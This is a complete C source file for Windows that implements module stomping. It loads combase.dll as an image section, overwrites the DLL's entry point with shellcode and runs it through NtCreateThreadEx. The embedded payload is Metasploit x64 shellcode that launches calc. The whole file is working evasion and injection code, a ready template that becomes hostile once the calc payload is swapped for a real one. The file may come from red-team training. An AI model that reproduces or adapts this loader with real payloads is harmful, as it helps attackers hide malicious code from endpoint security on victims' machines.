#include <windows.h>
#include <stdio.h>

#include "structs.h"

#define PRNT_WN_ERR(szWnApiName)			printf("[!] %ws Failed With Error: %d \n", szWnApiName, GetLastError());
#define PRNT_NT_ERR(szNtApiName, NtErr)		printf("[!] %ws Failed With Error: 0x%0.8X \n", szNtApiName, NtErr);

#define DELETE_HANDLE(H)								\
	if (H != NULL && H != INVALID_HANDLE_VALUE){		\
		CloseHandle(H);									\
		H = NULL;										\
	}	

typedef struct _NTAPIFP
{
	fnNtCreateSection				pNtCreateSection;
	fnNtMapViewOfSection			pNtMapViewOfSection;
	fnNtCreateThreadEx				pNtCreateThreadEx;

} NTAPIFP, * PNTAPIFP;

NTAPIFP		g_NtApi = { 0x00 };

BOOL LoadDllFile(IN LPCWSTR szDllFilePath, OUT HMODULE* phModule, OUT PULONG_PTR puEntryPnt) {

	HANDLE				hFile				= INVALID_HANDLE_VALUE,
						hSection			= NULL;
	NTSTATUS			STATUS				= STATUS_SUCCESS;
	ULONG_PTR			uMappedModule		= NULL;
	SIZE_T				sViewSize			= NULL;
	PIMAGE_NT_HEADERS   pImgNtHdrs			= NULL;

	if (!szDllFilePath || !phModule || !puEntryPnt)
		return FALSE;

	if ((hFile = CreateFileW(szDllFilePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		PRNT_WN_ERR(TEXT("CreateFileW"));
		goto _FUNC_CLEANUP;
	}

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0x00, PAGE_READONLY, SEC_IMAGE, hFile)))) {
		PRNT_NT_ERR(TEXT("NtCreateSection"), STATUS);
		goto _FUNC_CLEANUP;
	}

	DELETE_HANDLE(hFile);

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtMapViewOfSection(hSection, NtCurrentProcess(), &uMappedModule, NULL, NULL, NULL, &sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)))) {
		PRNT_NT_ERR(TEXT("NtMapViewOfSection"), STATUS);
		goto _FUNC_CLEANUP;
	}

	pImgNtHdrs = (PIMAGE_NT_HEADERS)(uMappedModule + ((PIMAGE_DOS_HEADER)uMappedModule)->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		goto _FUNC_CLEANUP;
	
	*phModule			= (HMODULE)uMappedModule;
	*puEntryPnt			= uMappedModule + pImgNtHdrs->OptionalHeader.AddressOfEntryPoint;

_FUNC_CLEANUP:
	DELETE_HANDLE(hFile);
	DELETE_HANDLE(hSection);
	return (*phModule && *puEntryPnt) ? TRUE : FALSE;
}

BOOL VerifyInjection(IN ULONG_PTR uSacrificialModule, IN ULONG_PTR uEntryPoint, IN SIZE_T sPayloadSize) {


	PIMAGE_NT_HEADERS		pImgNtHdrs		= NULL;
	PIMAGE_SECTION_HEADER	pImgSecHdr		= NULL;
	ULONG_PTR				uTextAddress	= NULL;
	SIZE_T					sTextSize		= NULL,
							sTextSizeLeft	= NULL;

	pImgNtHdrs = (PIMAGE_NT_HEADERS)(uSacrificialModule + ((PIMAGE_DOS_HEADER)uSacrificialModule)->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;

	pImgSecHdr = IMAGE_FIRST_SECTION(pImgNtHdrs);
	for (int i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {
		
		if ((*(ULONG*)pImgSecHdr[i].Name | 0x20202020) == 'xet.') {
			uTextAddress	= uSacrificialModule + pImgSecHdr[i].VirtualAddress;
			sTextSize		= pImgSecHdr[i].Misc.VirtualSize;
			break;
		}
	}


	if (!uTextAddress || !sTextSize)
		return FALSE;

/*
	     -----------	*uTextAddress*
		|			|
		|	  Y		|	>>>	Y = uEntryPoint - uTextAddress
		|			|
		 -----------	*uEntryPoint*
		|			|
		|			|
		|	  X		|	>>> X = sTextSize - Y	
		|			|
		|			|
		 -----------	*uTextAddress + sTextSize*
*/
	// Calculate the size between the entry point and the end of the text section.
	sTextSizeLeft = sTextSize - (uEntryPoint - uTextAddress);

	printf("[i] Payload Size: %d Byte\n", sPayloadSize);
	printf("[i] Available Memory (Starting From The EP): %d Byte\n", sTextSizeLeft);

	// Check if the shellcode can fit 
	if (sTextSizeLeft >= sPayloadSize)
		return TRUE;

	return FALSE;
}

BOOL ShellcodeModuleStomp(IN LPCWSTR szSacrificialDll, IN PBYTE pBuffer, IN SIZE_T sBufferSize) {

	NTSTATUS	STATUS					= STATUS_SUCCESS;
	HMODULE		hSacrificialModule		= NULL;
	ULONG_PTR	uEntryPoint				= NULL;
	HANDLE		hThread					= NULL;
	DWORD		dwOldProtection			= 0x00;

	if (!szSacrificialDll || !pBuffer || !sBufferSize)
		return FALSE;

	if (!LoadDllFile(szSacrificialDll, &hSacrificialModule, &uEntryPoint))
		return FALSE;

	printf("[*] %ws Loaded Successfully At: 0x%p \n", szSacrificialDll, (PVOID)hSacrificialModule);
	printf("[i] Entry Point: 0x%p \n", (PVOID)uEntryPoint);

	if (!VerifyInjection((ULONG_PTR)hSacrificialModule, uEntryPoint, sBufferSize))
		return FALSE;

	printf("[#] Press <Enter> To Continue ... ");
	getchar();

	
	if (!VirtualProtect(uEntryPoint, sBufferSize, PAGE_READWRITE, &dwOldProtection)) {
		PRNT_WN_ERR(TEXT("VirtualProtect"));
		return FALSE;
	}

	memcpy(uEntryPoint, pBuffer, sBufferSize);

	/* NOTE: YOUR PAYLOAD MAY REQUIRE RWX PERMISSIONS*/
	// dwOldProtection's VALUE IS RX	
	if (!VirtualProtect(uEntryPoint, sBufferSize, dwOldProtection, &dwOldProtection)) {
		PRNT_WN_ERR(TEXT("VirtualProtect"));
		return FALSE;
	}

	printf("[#] Press <Enter> To Execute NtCreateThreadEx ... ");
	getchar();

	if (!NT_SUCCESS(g_NtApi.pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), uEntryPoint, NULL, FALSE, 0x00, 0x00, 0x00, NULL))) {
		PRNT_NT_ERR(TEXT("NtCreateThreadEx"), STATUS);
		return FALSE;
	}

	WaitForSingleObject(hThread, INFINITE);
	return TRUE;
}

// x64 calc metasploit shellcode 
unsigned char rawPayload[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};

#define SACRIFICAL_DLL	L"C:\\Windows\\System32\\combase.dll"

int main() {

	HMODULE		hNtdll			= NULL;

	if (!(hNtdll = GetModuleHandle(TEXT("NTDLL"))))
		return -1;

	g_NtApi.pNtCreateSection		= (fnNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
	g_NtApi.pNtMapViewOfSection		= (fnNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
	g_NtApi.pNtCreateThreadEx		= (fnNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");

	if (!g_NtApi.pNtCreateSection || !g_NtApi.pNtMapViewOfSection || !g_NtApi.pNtCreateThreadEx)
		return -1;

	if (!ShellcodeModuleStomp(SACRIFICAL_DLL, rawPayload, sizeof(rawPayload)))
		return -1;

	
	return 0;
}